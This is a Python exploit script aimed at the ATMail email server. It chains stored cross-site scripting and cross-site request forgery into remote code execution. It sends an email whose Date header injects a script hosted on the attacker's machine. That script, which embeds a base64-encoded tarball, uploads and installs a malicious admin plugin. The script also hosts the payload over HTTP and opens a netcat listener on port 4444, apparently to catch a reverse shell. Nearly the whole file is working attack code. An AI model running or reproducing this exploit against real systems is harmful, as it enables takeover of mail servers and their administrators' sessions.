import argparse
import smtplib, argparse, threading, subprocess, sys, os
from time import sleep
from http.server import HTTPServer, SimpleHTTPRequestHandler

def sendMail(destination_email, from_email, smtp_server_ip, attacker_ip):
    payload = f'<script src="http://{attacker_ip}/atmail-payload.js"></script>'
    msg  = f"From: {from_email}\n"
    msg += f"To: {destination_email}\n"
    msg += f"Date: {payload}\n"
    msg += "Subject: Definitely Not a Malicious Email\n"
    msg += "Content-type: text/html\n\n"
    msg += "rs0n wuz here"
    msg += '\r\n\r\n'
    server = smtplib.SMTP(smtp_server_ip)
    try:
        server.sendmail(from_email, destination_email, msg)
        print("[+] Payload Delivered Successfully!")
    except Exception as e:
        print("[-] Failed to send email:")
        print("[*] " + str(e))
    server.quit()

def run_server(attacker_ip):
    try:
        os.chdir("/tmp")
        httpd = HTTPServer((attacker_ip, 80), SimpleHTTPRequestHandler)
        httpd.serve_forever()
    except Exception as e:
        print(f"[!] ERROR: {e}")
        print("[!] Python server failed!  Exiting...")
        sys.exit(-1)

def run_listener(port):
    try:
        subprocess.run([f"nc -lnvp {port}"], shell=True)
    except Exception as e:
        print(f"[!] ERROR: {e}")
        print("[!] Netcat listener failed!  Exiting...")
        sys.exit(-1)

def load_payload(js_payload_oneline):
    f = open('/tmp/atmail-payload.js', 'w')
    f.write(js_payload_oneline)
    f.close()

def arg_parse():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t','--targetip', help='IP Address of ATMail Server', required=True)
    parser.add_argument('-a','--attackerip', help='IP Address of Attacker Machine', required=True)
    parser.add_argument('-u', '--url', help='URL of ATMail Homepage (http://atmail.com)', required=True)
    parser.add_argument('-d','--dstemail', help='Email Address of Target', required=True)
    parser.add_argument('-f','--frmemail', help='Email Address of Attacker', required=True)
    return parser.parse_args()

def main(args):
    print(f"[+] ATMail Email Server -- XSS + CSRF -> RCE through Malicious Plugin")
    print("[+] Building Payload...")
    js_payload = """var b64file="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";function base64toBlob(n,t){t=t||"";for(var e=atob(n),E=e.length,r=Math.ceil(E/1024),s=new Array(r),o=0;o<r;++o){for(var h=1024*o,a=Math.min(h+1024,E),p=new Array(a-h),A=h,X=0;A<a;++X,++A)p[X]=e[A].charCodeAt(0);s[o]=new Uint8Array(p)}return new Blob(s,{type:t})}var content_type="application/x-compressed-tar",blob=base64toBlob(b64file,content_type),formData=new FormData;formData.append("newPlugin",blob,"Payload.tgz");var url="http://atmail/index.php/admin/plugins/preinstall",request=new XMLHttpRequest;request.open("POST",url),request.send(formData);var secondUrl="http://atmail/index.php/admin/plugins/add/file/UGF5bG9hZC50Z3o=",secondRequest=new XMLHttpRequest;setTimeout(function(){secondRequest.open("GET",secondUrl),secondRequest.send();}, 5000);"""
    load_payload(js_payload)
    print("[+] Hosting Payload on HTTP Server...")
    server_thread = threading.Thread(target=run_server, args=(args.attackerip,))
    server_thread.start()
    print("[+] Starting Netcat Listener...")
    listener_thread = threading.Thread(target=run_listener, args=("4444",))
    listener_thread.start()
    sleep(.5)
    print("[-] Sending Malicous Email...")
    sendMail(args.dstemail, args.frmemail, args.targetip, args.attackerip)
    print("[-] And now we wait.......")

if __name__ == "__main__":
    args = arg_parse()
    main(args)